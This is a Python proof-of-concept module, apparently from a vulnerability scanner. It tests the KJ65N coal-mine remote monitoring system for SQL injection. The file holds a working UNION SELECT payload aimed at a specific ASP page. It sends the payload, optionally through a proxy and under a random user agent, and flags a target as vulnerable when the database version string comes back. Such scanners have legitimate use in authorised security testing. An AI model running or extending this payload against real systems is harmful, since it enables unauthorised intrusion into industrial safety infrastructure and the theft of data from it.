#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: kj65n煤矿远程监控系统SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0148855
author: Ascotbe
reference: Lucifer
description: 
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/yhpc/trbl_deal_modi.asp?pActFlag=MODIFY&pId=-7653%27%20UnIoN%20AlL%20SeLeCt%20NuLL,NuLL,NuLL,NuLL,@@version,NuLL,NuLL,NuLL,NuLL,NuLL--"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if code==200 and con.lower().find('microsoft sql server')!=-1:
            Medusa = "{} 存在kj65n煤矿远程监控系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass